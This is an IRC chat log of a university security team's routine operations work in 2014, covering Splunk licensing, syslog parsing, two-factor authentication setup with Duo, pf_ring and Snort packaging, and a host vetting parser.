2014-04-30 12:19:18	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-04-30 12:19:30	--	Mode #security [+]
2014-04-30 12:19:30	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-04-30 13:27:26	hypnotoad	wardog: i'm going to have to go in a few but we got somewhere on the logs situation with its
2014-04-30 13:28:40	hypnotoad	they finally admitted it was their doing. the steps forward are to compare the logs for pop.ncsa.uiuc.edu on seclogs and its-log. if they are different, this would suggest udp logs before their forwarder is to blame (rsaam1 and pop both use udp). if they are the same this would probably suggest that rsa just sucks and uses a weird format that syslog doesn't parse by defualt
2014-04-30 13:31:31	wraquel	yay... movement.
2014-04-30 13:35:05	hypnotoad	gotta run
2014-04-30 15:19:56	wraquel	I definitely see pop.
2014-04-30 15:20:10	wraquel	well, if memory serves....
2014-04-30 15:20:14	wraquel	will double check
2014-04-30 15:21:08	wraquel	jazoff: go ahead and pull back the bro_bulk logs from Splunk.
2014-04-30 15:21:59	wraquel	We're gonna cut this one close.... I'll push our old license on in the morning.
2014-04-30 15:23:50	jazoff	ok
2014-04-30 15:24:08	jazoff	well.. the thing is
2014-04-30 15:24:24	jazoff	splunk will keep indexing the logs if it is over but then we cant search
2014-04-30 15:24:34	jazoff	but if I tell it to stop indexing the bro logs they wont be indexed at all
2014-04-30 15:24:58	jazoff	(they can technically be added back in later though, but not exactly easily)
2014-04-30 15:25:30	jazoff	so if it's just a day or so maybe it's better to let it just lock us out of searching ?
2014-04-30 15:44:37	wraquel	It's not a day.
2014-04-30 15:44:51	wraquel	Licensing is holed up in purchasing for the foreseeable future.
2014-04-30 15:44:58	wraquel	And all we have is the 10G license to fall back on.
2014-04-30 15:45:26	jazoff	ok
2014-04-30 15:45:29	wraquel	I would say, strip it down to under 10G. When the campus licensing finally comes through, we build a Splunk 6 system from scratch.
2014-04-30 15:45:36	jazoff	works for me
2014-04-30 15:46:16	wraquel	As long as we have the logs somewhere to search, supercell or analysis-sec, then that's fine.
2014-04-30 15:46:23	wraquel	er log-sec
2014-04-30 15:48:14	jazoff	yeah
2014-04-30 15:48:25	jazoff	they will still get archived o lowp
2014-04-30 15:58:49	jazoff	ok, done
2014-04-30 15:59:00	jazoff	will check up on it tomorrow to see if I removed enough
2014-04-30 17:12:35	wraquel	If you run into the licensing error (campus license is set to expire May 1 08:15:31 CDT.
2014-04-30 17:12:50	wraquel	I have our perpetual license in lastpass
2014-04-30 17:13:24	wraquel	it's called 'Splunk Perpetual License'
2014-04-30 19:10:01	jazoff	ok
2014-05-01 10:00:12	wraquel	restarting splunk to apply the old license
2014-05-01 10:00:32	jazoff	ok
2014-05-01 10:00:44	jazoff	i checked this morning and it looked like we were going to be well under 10g
2014-05-01 10:00:54	jazoff	but even if we are not, we have 3 days to get it there :)
2014-05-01 10:11:39	wraquel	awesome
2014-05-01 13:11:22	hypnotoad	anyone got an opinion on this? https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/141.142.229.36
2014-05-01 13:11:29	hypnotoad	not sure if this warrants looking at more
2014-05-01 13:20:12	jazoff	isn't that wraquel's machine?
2014-05-01 13:20:20	jazoff	macmonwr = macmon wr
2014-05-01 13:20:35	jazoff	ah yes, gulp says it is :)
2014-05-01 13:20:42	jazoff	2014-05-01 08:36:23.000 CDT wraquel 141.142.229.36 fog ssh2 keyboard-interactive 
2014-05-01 13:20:58	hypnotoad	ahh idk. but why the hell you donwloading stuff from psybnc yo?
2014-05-01 13:21:27	jazoff	i recall that happening before as a test..
2014-05-01 13:23:52	hypnotoad	wraquel: 
2014-05-01 13:46:32	hypnotoad	ughhhh now that macmonwr jerk is downloading from altervista..
2014-05-01 14:15:29	wraquel	hypnotoad: what was it this time.
2014-05-01 14:15:51	wraquel	mac-monitor-warren-raquel = macmonwr
2014-05-01 14:16:01	hypnotoad	why you donwloading stuff from altervista and psybnc
2014-05-01 14:16:11	wraquel	Ah... Getting stuff ready for next week's CTF.
2014-05-01 14:16:12	wraquel	:D
2014-05-01 14:16:18	hypnotoad	aha ok carry on
2014-05-01 15:12:54	hypnotoad	so having to pull out the token code to go from any of our hosts behind fog in order to get to fog is kinda a pain...anyone see a good reason to require OTP from inside our nets to get to fog?
2014-05-01 15:14:32	eyrich	I think a 2fa host should always require 2fa
2014-05-01 15:16:52	jazoff	one of my bank accounts prompted me for a 2fa login the other day
2014-05-01 15:17:00	jazoff	they PROMPTED me for a phone number to send the token too
2014-05-01 15:17:01	jazoff	sigh
2014-05-01 15:17:16	jazoff	granted, it could check to see if it is one that I have on file, but I didn't try)
2014-05-01 15:17:45	hypnotoad	oof thats not..great
2014-05-01 16:41:14	hypnotoad	so it would seem our syslog issue from ITS is to be blamed on RSA's implementation of syslog
2014-05-01 20:34:00	wraquel	hypnotoad: It now has a hostname. Yay.. There's still a weird space in the time though, need to see if that's coming in before hitting relay01 or after.
2014-05-02 08:59:03	jazoff	eyrich: is there an rpm for vmware tools?
2014-05-02 08:59:21	jazoff	theres one for open-vm-tools....
2014-05-02 09:00:29	eyrich	yes - sam has the details - you can get from a vmware repo
2014-05-02 09:01:22	eyrich	http://packages.vmware.com/tools
2014-05-02 09:03:29	jazoff	it would be very easy with puppet to make any vmware machine automatically install it
2014-05-02 09:49:26	hypnotoad	jazoff: i was looking into that and for some reason i remember thinking it was a dead end. i'll reevaluate. obviously that would be preferred.
2014-05-02 09:50:02	jazoff	just needs to be added to puppet_configs/hieradata/development/virtual/vmware.yaml
2014-05-02 09:50:47	hypnotoad	right, but i remember thinking there was something wrong with the repo...idk i'll look into it
2014-05-02 11:25:43	hypnotoad	no nagios alerts since 1:55am? is that a bad thing?
2014-05-02 11:26:05	hypnotoad	nvm a few more just trickled in. still looking a little low compared to normal.
2014-05-02 12:30:29	hypnotoad	rsaam logs finally working as expected
2014-05-02 12:37:08	jazoff	yay? :)
2014-05-02 12:37:26	hypnotoad	oh yay. working with that group on them was like pulling teeth.
2014-05-02 12:56:24	jazoff	should the resolv be in hiera for production?
2014-05-02 12:56:28	jazoff	resolve module
2014-05-02 12:56:41	hypnotoad	ya i think so. doesnt' seem to have problems and we could sure use it i bet
2014-05-02 12:56:50	hypnotoad	we need to do an audit on whats where again i think
2014-05-02 12:56:55	jazoff	yeah
2014-05-02 12:57:33	hypnotoad	you wanna set up a call for next week with you me and jon and we can go through whats ready for primetime and whats still being developed and all that?
2014-05-02 12:57:54	jazoff	next week is educause
2014-05-02 12:58:11	hypnotoad	ah ok. the next then i suppose
2014-05-02 12:58:18	jazoff	ok
2014-05-02 12:58:57	hypnotoad	did you need the resolve module for something in specific?
2014-05-02 12:59:16	jazoff	i noticed that was why ircsay was not working on supercell
2014-05-02 12:59:21	jazoff	I just fixed it manually for now
2014-05-02 12:59:24	hypnotoad	ahhh gotcha.
2014-05-02 12:59:35	hypnotoad	ok gym time, be back in a bit
2014-05-02 13:45:58	jazoff	trying to figure out the best way to get snort going
2014-05-02 13:46:28	jazoff	the rpms from snort.org don't install easily, building it wouldn't be too hard but the daq module built against pf_ring might be tricky
2014-05-02 13:46:46	jazoff	i'd like to make rpms but I dont have rpms for the pf_ring stuff, which means more work
2014-05-02 14:03:49	hypnotoad	ya hopefully you wouldnt run into the same fpm issues im having
2014-05-02 14:10:47	jazoff	fpm works ok to create packages for programs, but things get tricky when you start packaging libraries
2014-05-02 14:10:56	jazoff	granted that isnt a fpm issue but a packaging issue in general
2014-05-02 14:12:03	jazoff	or something like trying to make a time machine package but tm needs broccoli library
2014-05-02 14:12:16	jazoff	when I was trying to make debian packages for bro that was the trickest part
2014-05-02 14:12:27	jazoff	making it bro+bro-scripts+broctl+brocoli
2014-05-02 14:14:02	hypnotoad	ahhh i see. well my fpm problem is just a package :( really dont wanna spec file it up..
2014-05-02 14:14:26	jazoff	you can have fpm spit out the spec file it gernates
2014-05-02 14:14:37	hypnotoad	well right the problem is fpm is failing
2014-05-02 14:14:40	jazoff	oh
2014-05-02 14:14:41	jazoff	boo
2014-05-02 14:14:56	hypnotoad	it fails creating one of its temp dirs it uses to build stuff
2014-05-02 14:15:09	jazoff	what error do you get?
2014-05-02 14:15:26	hypnotoad	i can show you in a bit. gonna finish eating here then try again
2014-05-02 15:10:10	hypnotoad	gah stupid vmware
2014-05-02 15:16:42	jazoff	grr, the ixgbe driver for the newest pf_ring does not build against the kernel we have
2014-05-02 15:17:05	jazoff	ah, someone else wrote about that on the list recently
2014-05-02 15:17:22	jazoff	svn it is..
2014-05-02 15:18:47	jazoff	that worked
2014-05-02 15:19:06	hypnotoad	as in latest svn pf_ring version?
2014-05-02 15:19:10	jazoff	yeah
2014-05-02 15:19:15	hypnotoad	that works
2014-05-02 15:32:24	jazoff	looks like everything builds there
2014-05-02 15:34:30	jazoff	one thing mentioned in the latest pf_ring  blog post about this...
2014-05-02 15:34:54	jazoff	http://www.ntop.org/pf_ring/not-all-servers-are-alike-with-pf_ring-zcdna-part-3/
2014-05-02 15:35:06	jazoff	Lesson 2: Plug your NICs on the correct NUMA node
2014-05-02 15:35:18	jazoff	apparently 2 single port 10g cards are better than 1 10g card
2014-05-02 15:35:41	jazoff	and when using one card using all cores means packets have to be moved from one numa node to the other
2014-05-02 15:53:30	jazoff	ah...
2014-05-02 15:53:40	jazoff	hypnotoad: puppet has the repo web server configured as repo-sec.internal.ncsa.edu
2014-05-02 15:53:50	jazoff	but its real hostname is repo-sec.ncsa.illinois.edu
2014-05-02 15:53:55	jazoff	that's why the vhost never worked right
2014-05-02 15:54:59	hypnotoad	well ya i caught that on the machines failling and never fixed it in puppet since it didnt work even after manually trying it on them
2014-05-02 15:54:59	hypnotoad	but ya that needs fixed for future reference
2014-05-02 15:54:59	hypnotoad	also it was internal until recently
2014-05-02 16:12:22	jazoff	ah, autopull did not restart when squall rebooted
2014-05-05 07:59:53	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-05-05 10:36:57	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-05-05 15:35:37	hypnotoad	i'm seeing a bunch of hosting hidden spam alerts and they all seem to be pointing to the same ip. anyone got an issue with me bhr'ing viagraonlinesverige . com?
2014-05-05 15:40:27	hypnotoad	oh chadchad. it's been too long...
2014-05-05 15:43:06	wraquel	chadchad? Sounds like a problem with voting cards...
2014-05-05 15:43:37	wraquel	So, the first person I run into in St. Louis, other than hotel staff, is Justin walking off the elevator
2014-05-05 15:43:56	hypnotoad	no its a guy who likes to use chadchad as a test password on his machines..
2014-05-05 15:45:38	wraquel	I was recalling the 2000 elections. That was a debacle.
2014-05-05 15:45:49	wraquel	But chadchad.. At least it's two words.
2014-05-05 15:45:54	hypnotoad	i followed. im just lost for words when its him
2014-05-05 15:46:02	hypnotoad	yes and guess what his username is?
2014-05-05 15:46:13	wraquel	chad
2014-05-05 15:46:18	hypnotoad	woooo you win
2014-05-05 15:46:23	wraquel	yes!
2014-05-05 15:46:36	hypnotoad	in fact now that i think about it, i think the chad chad comes from username and password not just password
2014-05-05 15:46:37	wraquel	Free awkward looks for life!
2014-05-05 15:46:52	wraquel	oh, well that's different.
2014-05-05 15:46:59	hypnotoad	yaa...
2014-05-05 15:47:07	wraquel	That's a capital offense.
2014-05-05 15:47:12	wraquel	(gotta change my passwords)
2014-05-05 15:47:35	hypnotoad	also yefan-win7 has been the only one with insecure software every day since we've done it. at what point do we talk to him directly? ITS doesn't seem to be getting it done..
2014-05-05 15:48:22	wraquel	Any point now.
2014-05-05 15:48:37	hypnotoad	especially since that nasty flash bug last week..
2014-05-05 15:48:54	wraquel	yeah, that's weird. It even comes in on the weekend.
2014-05-05 15:49:54	wraquel	ok.. gotta go carpal tunnel my wrist with the final push of this coding.
2014-05-05 15:59:13	hypnotoad	yefan's vulnerable to this one http://www.cvedetails.com/cve/CVE-2014-0502/
2014-05-05 16:00:00	hypnotoad	total information disclosure (including system files), no authentication needed, and "very little knowledge" required to pull off...
2014-05-05 16:01:28	wraquel	Check with ITS, if they haven't been able to address it with the user then tell them we'll need to bhr it to protect the user and the network
2014-05-05 16:01:48	hypnotoad	oh...well i sent a note to bmather and the user already
2014-05-05 16:05:15	hypnotoad	yefan updated to flash 13.0.0.206
2014-05-05 16:05:15	hypnotoad	that wasn't hard..
2014-05-05 16:09:37	wraquel	we'll see, yefan, we'll see....
2014-05-05 16:16:40	jazoff	ah.. I just realized something with the insecure software reports
2014-05-05 16:16:47	jazoff	I think it might be slightly boken
2014-05-05 16:16:53	hypnotoad	oh..
2014-05-05 16:16:57	jazoff	it was a daily report for the last 24 hours, then we wanted it to be once a week
2014-05-05 16:17:05	jazoff	and I think i just changed it to be a once a week report for the last 24 hours
2014-05-05 16:17:11	jazoff	that is probably not what we wanted
2014-05-05 16:17:28	hypnotoad	oh so its basically only checking one day a week and sending once a week?
2014-05-05 16:17:38	jazoff	yeah
2014-05-05 16:17:44	hypnotoad	ah ya probably not what we want
2014-05-05 16:18:20	jazoff	just fixed it
2014-05-05 16:18:27	hypnotoad	hah tough fix huh?
2014-05-05 16:19:01	jazoff	change a 1 to a 7 :)
2014-05-05 16:27:39	wraquel	jazoff: want to grab food? And if so, what time?
2014-05-05 16:29:03	hypnotoad	please keep things on topic in this very serious chat room :)
2014-05-05 16:32:28	hypnotoad	interesting: http://arstechnica.com/security/2014/05/antivurus-pioneer-symantec-declares-av-dead-and-doomed-to-failure/
2014-05-05 16:34:12	jazoff	wraquel: i had a big lunch around 1 so I'm not very hungry now
2014-05-05 16:34:23	hypnotoad	burrito?
2014-05-05 16:40:23	jazoff	samlon bblt
2014-05-05 16:43:27	hypnotoad	bblt?
2014-05-05 16:56:08	jazoff	blt with 2x the b
2014-05-05 16:56:16	hypnotoad	ahhh that sounds good
2014-05-05 17:10:57	keist	lol to the burriot
2014-05-05 17:11:00	keist	burrito*
2014-05-05 17:13:40	wraquel	keist: did you go for a walk?
2014-05-05 17:21:27	keist	I did
2014-05-05 17:21:36	keist	we were both disappointed 
2014-05-05 17:21:47	keist	eyrich and I mean
2014-05-05 17:33:36	keist	well, that's enought nagios changes for one day
2014-05-06 08:09:07	eyrich	not getting useful data from ninfo - is there a problem with it
2014-05-06 08:09:51	eyrich	lots of yellow and red bar
2014-05-06 09:01:44	hypnotoad	not feeling well this morning taking at least the morning off
2014-05-06 09:14:32	jazoff	eyrich: what did you lookup?
2014-05-06 09:21:15	jazoff	ah.. netflowindexer web api wasn't running..
2014-05-06 09:21:25	jazoff	seem to have an issue where the upstart services do not start on boot
2014-05-06 09:26:48	jazoff	eyrich: ah, and the bhr plugin is having issues due to an isue with the csv files...
2014-05-06 09:26:56	jazoff	I had fixed it but I guess we did not push out the fix yet:
2014-05-06 09:26:58	jazoff	https://github.com/JustinAzoff/singularity/commit/af7217fc450f676ce65aa2244bee5588537c4862
2014-05-06 10:11:11	eyrich	what is the quickest way for me to see logs for a server.
2014-05-06 10:11:27	eyrich	I need to look at xdmod for qualys auth errors
2014-05-06 10:14:52	jazoff	in splunk, index=* host=xdmod
2014-05-06 10:15:26	jazoff	that should work, unless it is not sending the right hostname, if not, index=* xdmod should still find it
2014-05-06 10:16:03	eyrich	nothing
2014-05-06 10:16:18	eyrich	I will ask the admin if they are sending logs
2014-05-06 10:20:14	jazoff	speaking of qualisy
2014-05-06 10:20:17	jazoff	qualys
2014-05-06 10:20:28	jazoff	i remmber the talk of admins not wanting to give qualys ssh access
2014-05-06 10:20:52	jazoff	it would probably be really easy to write a shell in python that can log all commands that are ran to syslg
2014-05-06 10:21:06	jazoff	and maybe run in learning or enforcing mode
2014-05-06 10:21:20	eyrich	most of them are ok with ssh access now - they wont give it su
2014-05-06 10:21:24	jazoff	ahh
2014-05-06 10:21:51	jazoff	I wouldn't either.. I wonder what it would do if you ran its shell with fakeroot so it thinks it has root
2014-05-06 10:22:21	eyrich	it wants to check password expirations and things
2014-05-06 10:22:30	eyrich	we get most of the good stuff without su
2014-05-06 10:22:40	eyrich	out of data packages and kernel verisons
2014-05-06 10:22:51	jazoff	ah
2014-05-06 14:37:54	hypnotoad	alright. got bwbh-test to actually authenticate against RSA. now if i could just get the sshd_config to work properly
2014-05-07 09:52:57	jazoff	eyrich: did you see my message about the fix for the BHR csv files?
2014-05-07 09:53:55	eyrich	nope
2014-05-07 09:54:14	eyrich	actually yes - but missed that it was for bhr
2014-05-07 09:54:26	eyrich	thought you were saying fo ninfo
2014-05-07 09:54:35	eyrich	I will work on getting it installerd later
2014-05-07 09:54:41	jazoff	ok :)
2014-05-07 09:54:52	jazoff	it's why the bhr ninfo plugin is broken
2014-05-07 11:19:27	hypnotoad	jazoff: bwbh_user_check is having some problems
2014-05-07 11:20:37	hypnotoad	nvm i figured out the problem
2014-05-07 12:13:39	hypnotoad	well this looks kinda cool...http://www.sysdig.org/
2014-05-07 12:13:57	hypnotoad	"Think of it as strace + tcpdump + lsof + awesome sauce.
2014-05-07 12:13:57	hypnotoad	With a little Lua cherry on top."
2014-05-07 13:11:54	eyrich	jazoff: try pulling the next csv
2014-05-07 13:53:52	jazoff	yeah, sysdig looks neat
2014-05-07 13:53:56	jazoff	not quite dtrace but getting there
2014-05-07 13:54:41	jazoff	eyrich: looks good
2014-05-07 15:34:08	hypnotoad	eyrich: should sects01 be getting backed up in crashplan?
2014-05-08 09:24:48	wraquel	spiderfoot.net
2014-05-08 10:15:43	hypnotoad	wraquel: what about it?
2014-05-08 10:17:03	wraquel	Thought it looked interesting.
2014-05-08 10:17:32	hypnotoad	ah ok i didnt wanna go there assuming that until i knew you weren't saying it needed bhr'd or something
2014-05-08 10:18:32	hypnotoad	oooo ive seen this before. i refuse to be interested because whoever created it spams the hell outta some listserve im on with news about it. like 3 emails a week when this listserv gets about 10 a week
2014-05-08 10:49:24	eyrich	does flows-sec prefer version 5 or 9 flows?
2014-05-08 10:51:08	hypnotoad	not sure how to check
2014-05-08 11:07:24	hypnotoad	wraquel: email sent to IRST that really depends on your reply..
2014-05-08 11:23:56	jazoff	so...
2014-05-08 11:24:30	jazoff	find /lib/modules/`uname -r`|grep nf_conntrack_proto_dccp
2014-05-08 11:24:31	jazoff	/lib/modules/2.6.32-431.3.1.el6.x86_64/kernel/net/netfilter/nf_conntrack_proto_dccp.ko
2014-05-08 11:24:37	jazoff	[jazoff@fog ~]$ lsmod|grep dccp
2014-05-08 11:24:37	jazoff	[jazoff@fog ~]$
2014-05-08 11:24:53	jazoff	can't we just make sure it is not loaded and remove the module?
2014-05-08 11:25:05	jazoff	i'm not even sure if it would load automatically if it's not already needed
2014-05-08 11:25:25	hypnotoad	well that is the workaround. i guess i wasnt sure if it would be worth the effort figuring out what impact that would have vs just patching 
2014-05-08 11:25:49	jazoff	i don't think anything uses dccp
2014-05-08 11:26:16	jazoff	so especially since the module is not loaded already, removing it would not break anything...
2014-05-08 11:26:48	hypnotoad	well the workaround is just to not load it. removing it isn't even necessary
2014-05-08 11:26:55	jazoff	ah
2014-05-08 11:27:03	jazoff	so it seems it really is a non-issue then
2014-05-08 11:27:07	hypnotoad	so i supppose just make sure its not loaded
2014-05-08 11:27:13	jazoff	yeah :)
2014-05-08 11:27:24	hypnotoad	i just didnt wanna do that and have it break things vs use the official patch
2014-05-08 11:28:01	hypnotoad	but i shoulda not just taken peoples' word for it that it was loaded by default in rhel
2014-05-08 11:28:19	jazoff	ah. in the case of DCCP i think the chances of it breaking anything are 0
2014-05-08 11:28:28	jazoff	if we needed dccp connectino tracking it would be loaded already
2014-05-08 11:28:49	hypnotoad	well right, and i wasnt sure if we were using it already
2014-05-08 11:28:49	 *	hypnotoad is not very familiar with dccp
2014-05-08 11:28:55	jazoff	http://en.wikipedia.org/wiki/Datagram_Congestion_Control_Protocol
2014-05-08 11:29:04	jazoff	some obscure thing that we have no use for
2014-05-08 11:29:16	jazoff	Congestion.. what's that? :)
2014-05-08 11:29:27	jazoff	is that what you have when you don't have more bandwidth than everyone else? :)
2014-05-09 16:31:51	keist	where are polo{a,b} located and their IP's (don't resolve and not in wiki IP space pages)? also, is polot related to these hosts?
2014-05-12 09:34:28	jazoff	nice..
2014-05-12 09:34:56	jazoff	there was some transfer that ran at 10G for 24 hours or so.. all filtered from the dev clsuter
2014-05-12 10:03:38	hypnotoad	poloa and polob don't exist yet keist
2014-05-12 10:15:46	jazoff	source => '192.249.7.62' ?
2014-05-12 10:18:30	hypnotoad	thats the backup at NICS
2014-05-12 10:18:56	jazoff	this is something new?
2014-05-12 10:18:57	hypnotoad	for polo's
2014-05-12 10:19:06	hypnotoad	no its part of the whole CA thing
2014-05-12 10:19:09	jazoff	ahh
2014-05-12 10:30:06	jazoff	walk time :)
2014-05-12 10:48:21	jazoff	hot out there
2014-05-12 10:49:12	hypnotoad	were at 77 up here...what about you?
2014-05-12 10:50:29	keist	there's a Vagrant GUI for OSX now http://vagrantmanager.com
2014-05-12 10:51:08	wraquel	nice
2014-05-12 10:51:28	jazoff	78
2014-05-12 11:05:36	jazoff	hmm
2014-05-12 11:05:43	jazoff	[jazoff@drought ~]$ du -hs /usr/local/crashplan/cache/
2014-05-12 11:05:44	jazoff	76G     /usr/local/crashplan/cache/
2014-05-12 11:05:44	jazoff	that seems not right
2014-05-12 11:08:37	hypnotoad	arghh not particularly
2014-05-12 11:15:22	hypnotoad	alright cache cleaned up
2014-05-12 11:28:09	wraquel	jazoff: Do you age? https://lh3.googleusercontent.com/-eRM3mCM4AdY/UWhBKMPCPbI/AAAAAAAAEPU/mEOJ0qp2Fvs/s1000/unisog.jpg
2014-05-12 11:28:12	wraquel	This is from 2005.
2014-05-12 11:31:13	jazoff	ah, I was meaning to dig up that picture
2014-05-12 11:31:48	jazoff	i think I have a better quality version of it
2014-05-12 11:33:53	hypnotoad	jazoff: you think we can work on the vetting stuff soon? i got a few i gotta do and a bigger batch in the works
2014-05-12 11:33:59	jazoff	oh, yes
2014-05-12 11:34:02	jazoff	I started that last week
2014-05-12 11:34:11	hypnotoad	ah ok. where we at?
2014-05-12 11:34:16	jazoff	lemme push to git-sec
2014-05-12 11:34:30	jazoff	i made some tweaks to your vetting script to make parsing easier
2014-05-12 11:34:38	hypnotoad	 cool
2014-05-12 11:35:40	jazoff	https://git-sec.internal.ncsa.edu/ncsa-security/vetting-parser/tree/master
2014-05-12 11:36:51	jazoff	need some more test cases
2014-05-12 11:36:57	jazoff	and once the parsing is done doing the REST stuff should be easy
2014-05-12 11:37:21	hypnotoad	i can run the script on a few different hosts if that will help for the test cases
2014-05-12 11:38:11	jazoff	definitely
2014-05-12 11:38:24	jazoff	you can see tests/test_parsing.py is pretty bare right now
2014-05-12 11:38:32	jazoff	though I can add some more checks with the test file I have no
2014-05-12 11:38:33	jazoff	w
2014-05-12 11:39:24	hypnotoad	hah ya a little more needs added. where are the changes you made to the vetting script. i have that script in puppet so i can make those changes then start pumping that out to all the hosts
2014-05-12 11:39:35	jazoff	i made the changes in puppet already
2014-05-12 11:39:40	hypnotoad	ah sweet
2014-05-12 11:39:59	hypnotoad	then i'll go turn that on in dev and run it there. 
2014-05-12 12:19:56	jazoff	eyrich: is the BHR stuff ok?
2014-05-12 12:20:04	jazoff	looks like the stats logs have been sporadic
2014-05-12 12:20:42	jazoff	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/BHR
2014-05-12 12:22:24	eyrich	jazoff: the emails have been getting generated
2014-05-12 12:22:33	eyrich	maybe problem with logs
2014-05-12 12:25:59	hypnotoad	jazoff: where do you want the audit files?
2014-05-12 12:26:19	jazoff	can you just commit them to the git repo in tests/ ?
2014-05-12 12:26:26	hypnotoad	sure
2014-05-12 12:26:30	jazoff	ok
2014-05-12 12:26:41	jazoff	I will build test cases for them and make sure they parse correctly
2014-05-12 12:30:13	eyrich	jazoff: did you get your duo admin account setup?
2014-05-12 12:30:32	eyrich	lunch
2014-05-12 12:30:49	hypnotoad	jazoff: added four more for you to try out
2014-05-12 12:30:49	hypnotoad	can do more later if needed
2014-05-12 12:31:54	jazoff	ok
2014-05-12 12:32:26	jazoff	eyrich: no, wasn't sure where to login / what username to use
2014-05-12 13:04:20	jazoff	bad nids-dev2
2014-05-12 13:15:30	eyrich	jazoff: username is your email address
2014-05-12 13:15:43	eyrich	login in at: https://admin.duosecurity.com/
2014-05-12 13:20:38	jazoff	heh
2014-05-12 13:20:43	jazoff	they want to 2fa me "We'll send you a push, text or call you with a login code at XXX-XXX-7345."
2014-05-12 13:22:13	wraquel	Watch out for long distance fees... :)
2014-05-12 13:26:46	jazoff	ohh, i think that is my lync number
2014-05-12 13:27:57	jazoff	worked :)
2014-05-12 13:29:26	jazoff	eyrich: wraquel: so, I think we just need to decide what features the duo web interface needs to have
2014-05-12 13:29:51	jazoff	if it was just enrollment, there is basically nothing to do other than setup a website that uses their standard api
2014-05-12 13:30:03	eyrich	jazoff: bob should have that doc
2014-05-12 13:30:06	jazoff	if we want self service device admin stuff, that is a little more work
2014-05-12 13:30:22	jazoff	not hard work.. just more
2014-05-12 13:30:39	wraquel	Yeah, I think one of the needs was the admin management stuff.
2014-05-12 13:31:10	jazoff	basically if it is here, it is easy to do: https://www.duosecurity.com/docs/adminapi
2014-05-12 13:31:20	eyrich	limited admin portal - allowing help desk to help users but not mess with integrations or enterprise polcies
2014-05-12 13:32:03	jazoff	ah, but not self service admin portal?
2014-05-12 13:32:40	eyrich	also some user self service - but not sure how much. I thought Bob had that all written up already
2014-05-12 13:33:06	eyrich	its a copy of the features Iowa is doing - in fact I thought we were getting their code base
2014-05-12 13:33:59	jazoff	i heard something about that.. supposedly it is all java
2014-05-12 13:34:42	jazoff	it looks like the duo API has everything you would ever need, just a matter of putting the peices together
2014-05-12 13:37:00	eyrich	i was told it was python
2014-05-12 13:38:16	jazoff	oh, we'll see then :)
2014-05-12 13:49:38	hypnotoad	eyrich: joe said Iowa was all java but he preferred python since thats what his guys know
2014-05-12 13:50:25	eyrich	ah
2014-05-12 13:50:39	eyrich	did they provide the feature requirments?
2014-05-12 13:50:57	hypnotoad	dont know the only reason i know that much is because i was with you at DCL that day
2014-05-12 13:51:22	eyrich	sorry thought that was jazoff - thanks for rememebering correctley
2014-05-12 13:52:48	hypnotoad	jazoff: you messing with bro-dev cluster?
2014-05-12 14:00:02	eyrich	jazoff: duo user page one required option would be adding and removing mobile devices
2014-05-12 14:01:31	jazoff	hypnotoad: i was yeah, should be working again now though
2014-05-12 14:01:39	hypnotoad	k
2014-05-12 14:01:41	jazoff	was trying to flip over to use the new pf_ring ZC stuff but ran into issues
2014-05-12 14:01:52	jazoff	so I backed out to how it was 
2014-05-12 14:02:16	jazoff	eyrich: that's no proble, api has "Associate Phone with User" and "Disassociate Phone from User"
2014-05-12 14:06:53	jazoff	and is even one of their examples: https://github.com/duosecurity/duo_client_python/blob/master/examples/create_user_and_phone.py
2014-05-12 14:07:33	jazoff	and they have an example that just verifies a phone number too https://github.com/duosecurity/duo_client_python/blob/master/examples/verify_phone_numer_with_voice_call.py
2014-05-12 14:27:44	jazoff	wraquel: it actually looks like it would be easy to make a two factor web proxy application
2014-05-12 14:28:44	jazoff	at least using duos apis and mod_auth_tkt
2014-05-12 14:29:22	jazoff	or mod_auth_pubtkt
2014-05-12 14:30:13	jazoff	though that wouldn't so much be a proxy but SSO where the provider requires TFA
2014-05-12 14:32:22	wraquel	Well, yeah, once a session is established, it shouldn't be a problem. You just can't use basic auth as that will attempt to re-use the otp every time.
2014-05-12 14:32:53	jazoff	yep
2014-05-12 14:32:54	wraquel	Web apps are fairly easy
2014-05-12 14:33:07	wraquel	It was trying to get basic auth to do it which was not possible.
2014-05-12 14:33:30	jazoff	ah yep :)
2014-05-12 14:33:31	wraquel	There's also lots of code snippets for integrating into X
2014-05-12 14:33:36	wraquel	python, perl, asp, etc
2014-05-12 14:33:48	jazoff	yeah, their api looks really nice
2014-05-12 14:33:49	hypnotoad	lemme guess which one jazoff is gonna go for :)
2014-05-12 14:34:30	jazoff	i want to set either DUO or the plain google-auth/TOTP stuff up for myself
2014-05-12 14:34:42	hypnotoad	duo takes about 10 seconds
2014-05-12 14:34:54	hypnotoad	and you can ever wrap all your other google auth stuff in the duo app.
2014-05-12 14:34:55	wraquel	slowpoke
2014-05-12 14:35:05	hypnotoad	i hunt and peck its not my fault..
2014-05-12 14:35:46	wraquel	http://fc04.deviantart.net/fs70/f/2011/045/f/5/hunt_and_peck_animation_by_fowlhunter-d39l6zc.gif
2014-05-12 14:36:49	hypnotoad	my face lights up like that when i find the key too
2014-05-12 16:31:48	jazoff	hypnotoad: hmm, looking at the vetting files I wonder if this shoud be changes:
2014-05-12 16:31:55	jazoff	Users with UID of 0:
2014-05-12 16:32:08	jazoff	well, hmm.. there is this main section: # Users with root permissions
2014-05-12 16:32:43	jazoff	but then 'Groups with root access and their users' and 'Users with UID of 0' and 'Users in root LDAP groups' are not in the #### sections
2014-05-12 16:33:23	jazoff	oh.. it's one field in the database anyway, I guess it doesn't matter
2014-05-12 16:33:26	hypnotoad	not sure what you mean
2014-05-12 16:33:35	hypnotoad	thats just three different ways for checking for root access
2014-05-12 16:33:45	hypnotoad	one is literally users with UID of 0 in the passwd file
2014-05-12 16:34:13	hypnotoad	one is looking at root groups (root, wheel, sudo, adm,admin)
2014-05-12 16:34:13	hypnotoad	and one checks based on k5login
2014-05-12 16:34:21	jazoff	yeah.. I was referring to just the formatting
2014-05-12 16:34:37	jazoff	but it doesn't matter since everything below '# Users with root permissions' goes into the same field in the database
2014-05-12 16:34:59	hypnotoad	oh ya
2014-05-12 16:34:59	hypnotoad	they are basically subheaders which i guess is the only place that exists
2014-05-12 16:35:31	hypnotoad	ya i guess you could just combine the $GROUP_ROOT $PASSWORD_ROOT $LDAP_ROOT outpu.
